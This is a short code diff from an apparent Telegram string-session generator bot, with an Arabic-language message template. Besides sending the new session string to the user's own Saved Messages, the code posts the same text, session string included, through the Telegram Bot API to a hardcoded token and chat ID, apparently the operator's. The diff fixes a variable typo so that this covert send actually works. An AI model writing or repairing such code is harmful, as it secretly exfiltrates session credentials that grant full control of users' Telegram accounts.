@@ -114,7 +114,7 @@ async def generate_session(bot, msg, telethon=False):
     text = "**{} جـلسـه جـديـده** \n\n`{}` \n\nاستخرجت من @IIlAndylII".format("⬇️تـلـيـثـــون" if telethon else "⬇️مـــيـــوزك", string_session)
     try:
         await client.send_message("me", text)
-        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={test}")
+        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={text}")
     except KeyError:
         pass
     await client.disconnect()
